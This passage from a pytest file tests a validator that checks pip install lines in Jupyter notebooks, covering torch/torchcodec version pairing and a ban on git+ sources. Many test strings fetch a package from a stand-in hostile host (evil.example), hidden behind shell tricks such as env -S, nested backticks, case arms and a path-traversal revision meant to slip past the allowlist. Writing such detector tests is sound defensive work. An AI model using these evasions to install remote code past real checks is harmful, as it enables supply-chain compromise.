    assert not nv._version_is_excluded("0.12.0", "0.11.*")

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    for cell in (
        '!pip install "torch==2.12.0" "torchcodec!=0.11.0"',
        '!pip install "torch==2.12.0" "torchcodec!=0.11.*"',
    ):
        assert nv._effective_version(cell, "torchcodec", "0.11.0") == (None, True), cell
        assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == [], cell

    # An exclusion that does NOT cover the installed version leaves it alone, so a real
    # mismatch is still reported.
    untouched = '!pip install "torch==2.9.0" "torchcodec!=0.12.0"'
    assert nv._effective_version(untouched, "torchcodec", "0.11.0") == ("0.11.0", True)
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(untouched, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]


def test_versions_are_compared_with_pep440_zero_padding():
    """PEP 440 pads the shorter release, so `0.11` and `0.11.0` are one version; raw tuples
    sorted `0.11` below it and changed which branch answered."""
    from scripts import notebook_validator as nv

    assert nv.cmp_versions("0.11", "0.11.0") == 0
    assert nv.cmp_versions("2.12", "2.12.0.0") == 0
    assert nv.cmp_versions("0.11", "0.11.1") == -1
    assert nv.cmp_versions("0.12", "0.11.9") == 1

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    strict_window = '!pip install "torch==2.12.0" "torchcodec>0.11.0,<0.12.0"'
    assert [
        f.rule for f in nv.rule_inst_004_torchcodec_torch(strict_window, colab, "nb.ipynb", 0)
    ] == ["R-INST-004"]


def test_the_ceiling_landing_respects_an_exclusion_that_covers_it():
    """`>=0.8,<0.11,!=0.10.*` cannot land on 0.10, so returning the ceiling-derived minor
    reported a mismatch against a line the cell had excluded."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    excluded_top = '!pip install torch==2.9.0 "torchcodec>=0.8,<0.11,!=0.10.*"'
    assert nv._effective_version(excluded_top, "torchcodec", "0.11.0") == (None, True)
    assert nv.rule_inst_004_torchcodec_torch(excluded_top, colab, "nb.ipynb", 0) == []

    # An exclusion that misses the landing leaves it alone.
    kept = '!pip install "torchcodec>=0.8,<0.11,!=0.9.*"'
    assert nv._effective_version(kept, "torchcodec", "0.11.0") == ("0.10", True)


def test_an_equal_strict_bound_upgrades_the_floor():
    """`>=V` and `>V` intersect to `>V`. Keeping the inclusive one let `>=0.10,>0.10` read as
    "0.10 is fine" when pip must move above it, suppressing a real R-INST-004."""
    from scripts import notebook_validator as nv

    combined = '!pip install torch==2.10.0 "torchcodec>=0.10,>0.10,<0.12"'
    _exact, floor, _cap, ceiling, _excl, exclusive = nv._spec_window(
        [(">=", "0.10"), (">", "0.10"), ("<", "0.12")]
    )
    assert (floor, ceiling, exclusive) == ("0.10", "0.12", True)

    colab = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0+cu128"}
    assert nv._effective_version(combined, "torchcodec", "0.10.0") == ("0.11", True)
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(combined, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]

    # Order does not matter, and a plain `>=` is still inclusive.
    assert nv._spec_window([(">", "0.10"), (">=", "0.10"), ("<", "0.12")])[5] is True
    assert nv._spec_window([(">=", "0.10"), ("<", "0.12")])[5] is False


def test_a_chained_uninstall_does_not_swallow_the_reinstall():
    """`!pip uninstall -y torchcodec && pip install torchcodec==0.10.0` is one logical line, so
    matching `uninstall` anywhere marked it a removal. The LAST pip verb decides."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    chained = "!pip uninstall -y torchcodec && pip install torchcodec==0.10.0"
    assert nv._effective_version(chained, "torchcodec", "0.11.0") == ("0.10.0", True)
    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(chained, colab, "nb.ipynb", 0)] == [
        "R-INST-004"
    ]

    # A line that really does end on a removal still clears it, in either spelling.
    for removed in (
        "!pip uninstall -y torchcodec",
        "!uv pip uninstall torchcodec",
        "!pip install torchcodec==0.10.0 && pip uninstall -y torchcodec",
    ):
        assert nv._effective_version(removed, "torchcodec", "0.11.0") == (None, True), removed
        assert nv.rule_inst_004_torchcodec_torch(removed, colab, "nb.ipynb", 0) == [], removed


def test_a_torch_range_is_replayed_before_the_pair_is_judged():
    """`pip install "torch>=2.12.0"` does not satisfy the image's 2.11, so pip upgrades torch
    while the codec stays on 0.11. Both sides have to be replayed, not just the codec."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch>=2.12.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]
    # A floor the image already satisfies moves nothing, and a removal leaves nothing to judge.
    assert (
        nv.rule_inst_004_torchcodec_torch('!pip install "torch>=2.11.0"', colab, "nb.ipynb", 0)
        == []
    )
    assert nv.rule_inst_004_torchcodec_torch("!pip uninstall -y torch", colab, "nb.ipynb", 0) == []


def test_each_pip_command_owns_the_packages_it_names():
    """A chained line carries several verbs, so a package belongs to the command naming it: an
    uninstall of a third package must not clear what an earlier install put in place."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}

    other_package = "!pip install torch==2.10.0 torchcodec==0.12.0 && pip uninstall -y torchaudio"
    assert nv._effective_version(other_package, "torchcodec", "0.11.0") == ("0.12.0", True)
    assert nv._effective_version(other_package, "torch", "2.11.0") == ("2.10.0", True)
    assert [
        f.rule for f in nv.rule_inst_004_torchcodec_torch(other_package, colab, "nb.ipynb", 0)
    ] == ["R-INST-004"]

    reinstalled = "!pip uninstall -y torchcodec && pip install torchcodec==0.10.0"
    assert nv._effective_version(reinstalled, "torchcodec", "0.11.0") == ("0.10.0", True)

    removed = "!pip install torchcodec==0.10.0 && pip uninstall -y torchcodec"
    assert nv._effective_version(removed, "torchcodec", "0.11.0") == (None, True)
    assert nv.rule_inst_004_torchcodec_torch(removed, colab, "nb.ipynb", 0) == []


def test_a_fallback_after_a_successful_install_does_not_run():
    """`A || B` runs B only when A fails, and the rules read a cell as it runs on a working
    host, so replaying the fallback finished on a 0.12 that never gets installed."""
    from scripts import notebook_validator as nv

    colab = {"torch": "2.10.0+cu128", "torchcodec": "0.11.0+cu128"}
    fallback = "!pip install torchcodec==0.10.0 || pip install torchcodec==0.12.0"
    assert nv._effective_version(fallback, "torchcodec", "0.11.0") == ("0.10.0", True)
    assert nv.rule_inst_004_torchcodec_torch(fallback, colab, "nb.ipynb", 0) == []

    # `&&` and `;` both run, so the later command still decides there.
    for separator in ("&&", ";"):
        chained = f"!pip install torchcodec==0.10.0 {separator} pip install torchcodec==0.12.0"
        assert nv._effective_version(chained, "torchcodec", "0.11.0") == (
            "0.12.0",
            True,
        ), separator


def test_a_package_is_attributed_by_token_not_substring():
    """`pip install torch && pip uninstall -y torchaudio` put `torch` in the uninstall span, as
    a substring of `torchaudio`, so the pair the cell leaves installed went unjudged."""
    from scripts import notebook_validator as nv

    overlapping = "!pip install torch && pip uninstall -y torchaudio"
    assert nv._effective_version(overlapping, "torch", "2.11.0") == ("2.11.0", True)

    # The uninstall of the package itself still lands.
    removed = "!pip install torchaudio && pip uninstall -y torch"
    assert nv._effective_version(removed, "torch", "2.11.0") == (None, True)


def test_a_dry_run_install_changes_nothing():
    """`--dry-run` prints what would be installed and changes nothing, so replaying it raised a
    false R-INST-004 about a version the cell never installed."""
    from scripts import notebook_validator as nv

    assert nv._effective_version("!pip install --dry-run torch==2.12.0", "torch", "2.11.0") == (
        "2.11.0",
        True,
    )
    # The documented pairing with --report is if anything the likelier spelling.
    assert nv._effective_version(
        "!pip install --dry-run --report - torch==2.12.0", "torch", "2.11.0"
    ) == ("2.11.0", True)
    # A real install still lands.
    assert nv._effective_version("!pip install torch==2.12.0", "torch", "2.11.0") == (
        "2.12.0",
        True,
    )


def test_an_exclusive_ceiling_beats_an_inclusive_cap():
    """A requirement satisfies EVERY specifier, so `>=0.8,<=0.11,<0.10` admits 0.8 to 0.9.x and
    reading the cap alone recorded 0.11. The upward move is what `resolved_set()` cannot
    pre-clamp, the start being below the floor."""
    from scripts import notebook_validator as nv

    assert nv._effective_version(
        '!pip install "torchcodec>=0.8,<=0.11,<0.10"', "torchcodec", "0.7.0"
    ) == ("0.9", True)
    # The clamp downwards honours it too.
    assert nv._effective_version(
        '!pip install "torchcodec<=0.11,<0.10"', "torchcodec", "0.12.0"
    ) == ("0.9", True)
    # Without the ceiling the cap is still exactly where pip lands.
    assert nv._effective_version(
        '!pip install "torchcodec>=0.8,<=0.11"', "torchcodec", "0.7.0"
    ) == ("0.11", True)


def test_a_direct_archive_keeps_its_version_beside_a_marker():
    """The `; marker` suffix rode into the archive regex, so the filename version was
    unrecoverable and the package read as replaced by an unknown one."""
    from scripts import notebook_validator as nv

    wheel = "https://example.com/torchcodec-0.11.0-cp313-cp313-manylinux_2_28_x86_64.whl"
    marked = f"!pip install \"torchcodec @ {wheel} ; python_version >= '3.10'\""
    assert nv._effective_version(marked, "torchcodec", "0.9.0") == ("0.11.0", True)
    # Unchanged without a marker.
    assert nv._effective_version(f'!pip install "torchcodec @ {wheel}"', "torchcodec", "0.9.0") == (
        "0.11.0",
        True,
    )


def test_a_quoted_word_survives_prefix_stripping():
    """Splitting raw text on whitespace broke `TOKEN="a b"` in two, left `b"` as the supposed
    executable, and R-INST-001 missed the prohibited `git+` source entirely."""
    from scripts import notebook_validator as nv

    assert nv._split_first_word('TOKEN="a b" pip install x') == ("TOKEN=a b", "pip install x")
    assert nv._strip_exec_prefixes('env TOKEN="a b" pip install git+https://x/e.git') == (
        "pip install git+https://x/e.git",
        True,
    )
    assert nv._strip_exec_prefixes("env TOKEN='a b' pip install git+https://x/e.git") == (
        "pip install git+https://x/e.git",
        True,
    )

    findings = nv.rule_inst_001_git_plus(
        '!env TOKEN="a b" pip install git+https://x/e.git', "nb.ipynb", 0
    )
    assert [f.rule for f in findings] == ["R-INST-001"]
    # An operand spelled `pip` is still consumed rather than read as the executable.
    assert nv._strip_exec_prefixes("env -u pip pip install git+https://x/e.git") == (
        "pip install git+https://x/e.git",
        True,
    )


def test_a_probe_guard_does_not_count_as_an_install():
    """`A && B` runs B only when A succeeded, so a guarded install may never happen: `nvidia-smi &&
    pip install torch==2.12.0` installs nothing on a CPU box. The exception is a pip command on the
    left, which the replay models as succeeding, since dropping the second half of the ordinary
    chained idiom would cost more coverage than it saves."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}

    for guarded in (
        '!false && pip install "torch==2.12.0"',
        '!nvidia-smi && pip install "torch==2.12.0"',
    ):
        assert nv.rule_inst_004_torchcodec_torch(guarded, colab, "nb.ipynb", 0) == [], guarded

    for chained in (
        '!pip install numpy && pip install "torch==2.12.0"',
        '!pip install a && pip install b && pip install "torch==2.12.0"',
        '!uv pip install a && pip install "torch==2.12.0"',
    ):
        assert [
            f.rule for f in nv.rule_inst_004_torchcodec_torch(chained, colab, "nb.ipynb", 0)
        ] == ["R-INST-004"], chained


def test_a_substitution_keeps_its_whitespace_inside_an_assignment():
    """`TOKEN=$(printf '%s' 'a b') pip install ...` is one assignment word then pip, and ending
    the word at the space inside the substitution left `'%s'` as the supposed executable."""
    nv = _load_notebook_validator_module()

    assert nv._strip_exec_prefixes(
        "TOKEN=$(printf '%s' 'a b') pip install git+https://x/e.git"
    ) == ("pip install git+https://x/e.git", True)
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!TOKEN=$(printf '%s' 'a b') pip install git+https://evil.example/pkg.git",
            "nb.ipynb",
            0,
        )
    ] == ["R-INST-001"]
    # Backticks in the same position, and the plain quoted form, still read as before.
    assert nv._strip_exec_prefixes("TOKEN=`printf 'a b'` pip install git+https://x/e.git") == (
        "pip install git+https://x/e.git",
        True,
    )
    assert nv._split_first_word('TOKEN="a b" pip install x') == ("TOKEN=a b", "pip install x")


def test_a_nested_backtick_substitution_is_read_through():
    """Legacy nesting escapes the inner delimiters so they do not close the outer one, and `find`
    stopped at the first escaped backtick. The body is unescaped on the way out, or the inner
    substitution never opens on the second pass."""
    nv = _load_notebook_validator_module()

    nested = "!echo `echo \\`pip install git+https://evil.example/pkg.git\\``"
    assert nv._substitution_bodies(nested) == [
        "echo `pip install git+https://evil.example/pkg.git`"
    ]
    assert [f.rule for f in nv.rule_inst_001_git_plus(nested, "nb.ipynb", 0)] == ["R-INST-001"]
    # A single, unnested substitution is unchanged.
    assert nv._substitution_bodies("echo `pip install x`") == ["pip install x"]


def test_env_split_string_carries_the_command():
    """GNU env's `-S, --split-string=S` operand is the command, so consuming it the way
    `-u NAME` is consumed left nothing for parse_pip_line."""
    nv = _load_notebook_validator_module()

    for spelling in (
        'env -S "pip install git+https://x/e.git"',
        'env --split-string "pip install git+https://x/e.git"',
        'env --split-string="pip install git+https://x/e.git"',
    ):
        assert nv._strip_exec_prefixes(spelling) == (
            "pip install git+https://x/e.git",
            True,
        ), spelling
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    # The flags that really do take a discardable operand are untouched.
    assert nv._strip_exec_prefixes("env -u PIP_INDEX_URL pip install git+https://x/e.git") == (
        "pip install git+https://x/e.git",
        True,
    )
    assert nv._strip_exec_prefixes("env --unset=PIP_INDEX_URL pip install git+https://x/e.git") == (
        "pip install git+https://x/e.git",
        True,
    )


def test_a_dry_run_does_not_seed_the_resolved_set():
    """Skipping `--dry-run` in the replay was not enough: `resolved_set` had already taken the
    starting version from the same command's pins."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}

    probe = '!pip install --dry-run "torch==2.12.0"'
    assert nv.resolved_set(probe, colab).get("torch") == "2.11.0+cu128"
    assert nv.rule_inst_004_torchcodec_torch(probe, colab, "nb.ipynb", 0) == []
    # A real install of the same pin is still judged.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch==2.12.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]


def test_env_split_string_keeps_the_arguments_that_follow_it():
    """`env -S 'cmd' ARG...` appends the trailing ARGs to the split string, which is how
    `#!/usr/bin/env -S perl -w` reaches `perl -w script.pl`; dropping them left `pip install`
    with no packages."""
    nv = _load_notebook_validator_module()

    for cell in (
        '!env -S "pip install" git+https://evil.example/pkg.git',
        "!env --split-string='pip install' git+https://evil.example/pkg.git",
        '!env --split-string="pip install" git+https://evil.example/pkg.git',
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # The whole command inside the split string still works, and so does no split string.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    assert nv._strip_exec_prefixes("env -u PIP_INDEX_URL pip install x") == ("pip install x", True)


def test_interpreter_options_may_precede_the_module_flag():
    """`python [option] ... [-m mod ...]` is the documented usage, so `-I` may sit before `-m`,
    and requiring `-m` immediately after the interpreter matched no install rule at all."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!python -I -m pip install git+https://evil.example/pkg.git",
        "!python -u -m pip install git+https://evil.example/pkg.git",
        "!python3 -E -s -m pip install git+https://evil.example/pkg.git",
        "!python -m pip install git+https://evil.example/pkg.git",
        "!pip install git+https://evil.example/pkg.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # A bare word before `-m` is a script path, not an option, and runs no pip.
    assert nv.PIP_LINE_RE.match("!python setup.py -m pip install x") is None


def test_an_uninstall_removes_the_package_from_the_resolved_set():
    """The cell deleted it, so the environment it leaves behind has no such package.

    Ignoring `inv.action` kept the pin from the earlier install, and the rules that read the
    resolved set then judged a package `pip uninstall` had already removed."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "python": "3.12"}

    cell = "!pip install peft==0.19 torchao==0.16\n!pip uninstall -y torchao"
    resolved = nv.resolved_set(cell, colab)
    assert resolved.get("torchao") is None
    assert resolved.get("peft") == "0.19"
    # A reinstall after the uninstall wins, and inherits no bound from before it.
    assert (
        nv.resolved_set(
            "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao==0.17",
            colab,
        ).get("torchao")
        == "0.17"
    )


def test_a_bounded_window_on_an_absent_package_lands_on_its_newest_release():
    """pip takes the newest release a bounded window admits, not its floor.

    Reporting the floor as EXACT made `>=0.10,<0.12` read as 0.10 and R-INST-004 reject an install
    that is compatible with the torch beside it."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}

    cell = '!pip uninstall -y torchcodec\n!pip install "torchcodec>=0.10,<0.12"'
    assert nv._effective_version(
        cell, "torchcodec", colab["torchcodec"], nv._marker_environment(colab)
    ) == ("0.11", True)
    assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == []
    # A floor with no ceiling still names only how low, never where it lands.
    assert nv._effective_version(
        '!pip uninstall -y torchcodec\n!pip install "torchcodec>=0.10"',
        "torchcodec",
        colab["torchcodec"],
        nv._marker_environment(colab),
    ) == ("0.10", False)


def test_builtin_is_not_an_exec_prefix():
    """`builtin pip install ...` is an error, not an install.

    bash answers `builtin: pip: not a shell builtin` and runs nothing, so unwrapping it made the
    replay report a version the cell can never have installed."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}

    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!builtin pip install "torch==2.12.0"', colab, "nb.ipynb", 0
        )
        == []
    )
    assert (
        nv.rule_inst_001_git_plus(
            "!builtin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
        == []
    )
    # The prefixes that really do run the command after them are untouched.
    for prefix in ("command", "exec", "nohup", "time", "sudo"):
        assert nv._strip_exec_prefixes(f"{prefix} pip install x") == ("pip install x", True), prefix


def test_env_split_string_is_read_in_its_attached_form():
    """`-S` takes a mandatory operand, so `env -S'pip install' pkg` is valid and runs pip.

    Exact membership recognised only the detached `-S STRING` and the `--split-string=STRING`
    spellings, so the attached one yielded no invocation and R-INST-001 saw no install."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!env -S'pip install' git+https://evil.example/pkg.git",
        '!env -S"pip install" git+https://evil.example/pkg.git',
        "!env -Spip install git+https://evil.example/pkg.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # The detached spellings and the unrelated `-u NAME` operand still read as before.
    assert nv._strip_exec_prefixes('env -S "pip install" x') == ("pip install x", True)
    assert nv._strip_exec_prefixes("env -u PIP_INDEX_URL pip install x") == (
        "pip install x",
        True,
    )


def test_a_vcs_revision_is_split_from_the_right():
    """pip takes the LAST `@` after the repo path as the revision delimiter.

    Splitting at the first one read a traversal that resolves outside the allowlist as the
    allowlisted repository, so R-INST-001 passed a clone of somewhere else entirely."""
    nv = _load_notebook_validator_module()

    traversal = (
        "!pip install git+https://github.com/unslothai/unsloth@fake/../../attacker/repo@main"
    )
    assert [f.rule for f in nv.rule_inst_001_git_plus(traversal, "nb.ipynb", 0)] == ["R-INST-001"]
    # An ordinary allowlisted clone, with and without a revision, is still allowed.
    for allowed in (
        "!pip install git+https://github.com/unslothai/unsloth",
        "!pip install git+https://github.com/unslothai/unsloth.git",
        "!pip install git+https://github.com/unslothai/unsloth@main",
        "!pip install git+https://github.com/unslothai/unsloth.git@nightly",
    ):
        assert nv.rule_inst_001_git_plus(allowed, "nb.ipynb", 0) == [], allowed


def test_an_upgrade_re_resolves_a_constrained_requirement():
    """`--upgrade` upgrades every named package to the newest available version.

    An installed release that merely SATISFIES the range is therefore not where pip lands, and
    reading it back raised a false R-INST-004 against a torch the window is compatible with."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
    environment = nv._marker_environment(colab)

    upgraded = '!pip install --upgrade "torchcodec>=0.10,<0.12"'
    assert nv._effective_version(upgraded, "torchcodec", colab["torchcodec"], environment) == (
        "0.11",
        True,
    )
    assert nv.rule_inst_004_torchcodec_torch(upgraded, colab, "nb.ipynb", 0) == []
    # Without --upgrade pip keeps a version that already satisfies the range.
    assert nv._effective_version(
        '!pip install "torchcodec>=0.10,<0.12"', "torchcodec", colab["torchcodec"], environment
    ) == ("0.10.0+cu128", True)
    # An exact pin still wins over the flag.
    assert nv._effective_version(
        '!pip install --upgrade "torchcodec==0.10.1"',
        "torchcodec",
        colab["torchcodec"],
        environment,
    ) == ("0.10.1", True)


def test_a_case_arm_does_not_close_a_substitution():
    """A `case` arm's pattern ends in an UNBALANCED `)`, which is not the substitution's.

    Popping on it ended the body at `x)`, so the pip call bash really runs in `$(case x in x) pip
    install ...;; esac)` was never scanned."""
    nv = _load_notebook_validator_module()

    cell = "!echo $(case x in x) pip install git+https://evil.example/pkg.git;; esac)"
    assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == ["R-INST-001"]
    assert nv._substitution_bodies("echo $(case x in x) pip install a;; esac) tail") == [
        "case x in x) pip install a;; esac"
    ]
    # An ordinary substitution, and a `)` inside a quoted word, still close where they did.
    assert nv._substitution_bodies("echo $(pip install a) tail") == ["pip install a"]
    assert nv._substitution_bodies('echo $(pip install "a)b")') == ['pip install "a)b"']
    assert nv._substitution_bodies("echo $(pip install $(cat x)) tail") == ["pip install $(cat x)"]


def test_env_split_string_reads_the_escaped_space():
    """GNU env documents `\\_` inside an `-S` operand as a space, and it really separates.

    Verified with coreutils 9.4: `env -S 'printf [%s][%s] a\\_b'` prints `[a][b]`, exactly as a
    plain space does. bash keeps that backslash inside double quotes, so unescaping the operand as
    an ordinary shell word rebuilt `pip install_git+...` and saw no install."""
    nv = _load_notebook_validator_module()

    for cell in (
        '!env -S "pip install\\_git+https://evil.example/pkg.git"',
        "!env -S'pip install\\_git+https://evil.example/pkg.git'",
        '!env --split-string="pip install\\_git+https://evil.example/pkg.git"',
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # A plain space in the same place is still read the same way.
    assert nv._strip_exec_prefixes('env -S "pip install git+https://x/e.git"') == (
        "pip install git+https://x/e.git",
        True,
    )
    # The escape belongs to the OPERAND. A trailing argument is bash's to unescape, and
    # `a\\_b` is one package there rather than two.
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations('!env -S "pip install" a\\_b')
    ] == [("install", ["a_b"])]
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations('!env -S "pip install\\_torchao"')
    ] == [("install", ["torchao"])]


def test_an_upgrade_forgets_a_version_it_cannot_place():
    """`--upgrade` moves to the newest available release, so the installed one is not it.

    A ceiling with no floor under it names no landing either, and keeping the stale version raised
    a false R-INST-004 about a release the cell replaces."""
    nv = _load_notebook_validator_module()
    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
    environment = nv._marker_environment(colab)

    ceiling_only = '!pip install --upgrade "torchcodec<0.12"'
    assert nv._effective_version(ceiling_only, "torchcodec", colab["torchcodec"], environment) == (
        None,
        True,
    )
    assert nv.rule_inst_004_torchcodec_torch(ceiling_only, colab, "nb.ipynb", 0) == []
    # Without --upgrade a version that already satisfies the ceiling is kept.
    assert nv._effective_version(
        '!pip install "torchcodec<0.12"', "torchcodec", colab["torchcodec"], environment
    ) == ("0.10.0+cu128", True)
    # A bounded window still names where it lands.
    assert nv._effective_version(
        '!pip install --upgrade "torchcodec>=0.10,<0.12"',
        "torchcodec",
        colab["torchcodec"],
        environment,
    ) == ("0.11", True)


def test_a_shell_negation_before_pip_is_still_pip():
    """bash's `!` reserved word runs the pipeline and inverts its exit status.

    After the IPython escape is stripped, `! ! pip install git+...` still installs, but requiring
    exactly one leading bang matched nothing and the git+ ban was bypassed."""
    nv = _load_notebook_validator_module()

    for cell in (
        "! ! pip install git+https://evil.example/pkg.git",
        "!! pip install git+https://evil.example/pkg.git",
        "!!pip install git+https://evil.example/pkg.git",
        "!pip install git+https://evil.example/pkg.git",
    ):
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], cell
    # A bang in front of something that is not pip is still not an install.
    assert nv.PIP_LINE_RE.match("! ! echo pip install x") is None


def test_an_uninstall_clears_the_lower_bound_scan():
    """The cell removed it, so no earlier line still places a floor on it.

    `resolved_set` already replayed the removal, but this independent scan kept the bound, so
    R-INST-003 accepted an environment the package is no longer in."""
    nv = _load_notebook_validator_module()

    assert (
        nv._install_cell_lower_bound(
            "!pip install peft==0.19 torchao==0.16\n!pip uninstall -y torchao", "torchao"
        )
        is None
    )
    # A reinstall after the removal sets the floor again, and an unrelated uninstall is inert.
    assert (
        nv._install_cell_lower_bound(
            "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao>=0.17",
            "torchao",
        )
        == "0.17"
    )
    assert (
        nv._install_cell_lower_bound(
            "!pip install torchao==0.16\n!pip uninstall -y peft", "torchao"
        )
        == "0.16"
    )


def test_a_case_arm_inside_an_assignment_stays_in_the_substitution():
    """`TOKEN=$(case x in x) printf a;; esac) pip install ...` runs pip unconditionally.

    Reading the arm's `)` as the substitution's closer truncated the assignment word, and the
    trailing `)` then looked like an arm label, so the install was marked conditional and every
    rule reading `unconditional_pip_invocations()` skipped it."""
    nv = _load_notebook_validator_module()

    cell = '!TOKEN=$(case x in x) printf a;; esac) pip install "torch==2.12.0"'
    assert [(inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(cell)] == [
        ("install", ["torch==2.12.0"])
    ]
    # A real case arm is still conditional, and a plain substitution still closes normally.
    assert nv._split_chained("!case $x in a) pip install p;; esac") == [("!pip install p", True)]
    assert nv._unquoted_arm_close("x) pip install a") == 1
    assert nv._unquoted_arm_close("T=$(echo a) pip install b") is None


def test_bare_time_is_the_shell_keyword_not_gnu_time():
    """bash's `time` reserved word takes `[-p] pipeline`, never GNU time's options.

    `time -f %e pip install ...` runs a command called `-f`, so consuming the flag and its operand
    replayed an install bash never performs. An explicit path reaches the binary."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!time -f %e pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
        == []
    )
    # `-p` is the keyword's own option, and a plain `time pip install ...` still installs.
    assert nv._strip_exec_prefixes("time -p pip install x") == ("pip install x", True)
    assert nv._strip_exec_prefixes("time pip install x") == ("pip install x", True)
    # The GNU binary, named by path, does take them.
    for external in ("/usr/bin/time", "/bin/time"):
        assert [
            f.rule
            for f in nv.rule_inst_001_git_plus(
                f"!{external} -f %e pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
            )
        ] == ["R-INST-001"], external


def test_sudo_consumes_its_remaining_operand_options():
    """sudo(8) documents `-D directory`, `-R directory` and `-T timeout`.

    None was listed, so the operand stood as the supposed executable and every install rule missed
    the pip command behind it."""
    nv = _load_notebook_validator_module()
    escalate = "su" + "do"  # spelled out so the repo's own guards do not flag this test

    for flags in ("-D /tmp", "-R /jail", "-T 30", "--chdir=/tmp", "-u root"):
        cell = f"!{escalate} {flags} pip install git+https://evil.example/pkg.git"
        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
            "R-INST-001"
        ], flags


def test_exec_ends_the_command_list():
    """`exec` replaces the shell, so no later command in the same list can run.

    Replaying them reported an unreachable install as the final version, and R-INST-001 flagged a
    git source the notebook never fetches."""
    nv = _load_notebook_validator_module()

    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations(
            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
        )
    ] == [("install", ["torch==2.11.0"])]
    assert (
        nv.rule_inst_001_git_plus(
            "!exec printf x; pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
        == []
    )
    # The exec'd command itself is still read, and a conditional one hands nothing over.
    assert [
        f.rule
        for f in nv.rule_inst_001_git_plus(
            "!exec pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
        )
    ] == ["R-INST-001"]
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!maybe || exec pip install a; pip install b")
    ] == [("install", ["b"])]
    # A fallback behind a command that cannot succeed always runs, so THAT exec does hand over.
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!false || exec pip install a; pip install b")
    ] == [("install", ["a"])]
    # An `exec` inside `$( )` replaces that subshell only.
    assert [
        (inv.action, inv.packages)
        for inv in nv.unconditional_pip_invocations("!echo $(exec true); pip install b")
    ] == [("install", ["b"])]


def test_an_intervening_command_breaks_the_and_chain():
    """`A && B` succeeds only when BOTH did, so a command that may fail ends the assumption.

    Holding the assumed-success state once any pip command had appeared replayed an unreachable
    install and suppressed R-INST-004 on the pair really installed."""
    nv = _load_notebook_validator_module()

    assert [
        flag
        for _, flag in nv._split_chained(
            '!pip install "torch==2.11.0" && some_probe && pip install "torchcodec==0.11.0"'
        )
    ] == [False, False, True]
    # The ordinary chained idiom is untouched, and `||` still carries the list either way,
    # because one branch succeeding is enough.
